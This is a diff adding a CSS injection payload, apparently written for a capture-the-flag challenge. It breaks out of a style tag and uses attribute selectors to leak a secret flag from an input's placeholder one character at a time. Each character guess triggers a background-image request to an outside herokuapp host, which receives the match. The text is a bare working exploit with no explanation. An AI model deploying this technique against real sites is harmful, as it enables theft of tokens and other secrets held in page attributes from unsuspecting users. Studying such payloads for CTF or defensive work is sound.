@@ -1,0 +1,56 @@
+[c=
+purple;}input[placeholder^="flag{waterfall_bfutsftfejpka"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?a');
+}
+input[placeholder^="flag{waterfall_bfutsftfejpkt"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?t');
+}
+input[placeholder^="flag{waterfall_bfutsftfejpkc"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?c');
+}
+input[placeholder^="flag{waterfall_bfutsftfejpkk"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?k');
+}
+input[placeholder^="flag{waterfall_bfutsftfejpke"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?e');
+}
+input[placeholder^="flag{waterfall_bfutsftfejpkf"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?f');
+}
+input[placeholder^="flag{waterfall_bfutsftfejpkw"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?w');
+}
+input[placeholder^="flag{waterfall_bfutsftfejpkg"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?g');
+}
+input[placeholder^="flag{waterfall_bfutsftfejpkj"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?j');
+}
+input[placeholder^="flag{waterfall_bfutsftfejpks"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?s');
+}
+input[placeholder^="flag{waterfall_bfutsftfejpku"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?u');
+}
+input[placeholder^="flag{waterfall_bfutsftfejpkw"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?w');
+}
+input[placeholder^="flag{waterfall_bfutsftfejpkr"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?r');
+}
+input[placeholder^="flag{waterfall_bfutsftfejpkl"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?l');
+}
+input[placeholder^="flag{waterfall_bfutsftfejpkb"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?b');
+}
+input[placeholder^="flag{waterfall_bfutsftfejpkp"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?p');
+}
+input[placeholder^="flag{waterfall_bfutsftfejpk}"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?}');
+}
+input[placeholder^="flag{waterfall_bfutsftfejpk_"]{
+	background-image:url('https://hi-hi-hi-hi-hi.herokuapp.com/?_');
+}
+#stfu{smhimaginebeingbad]
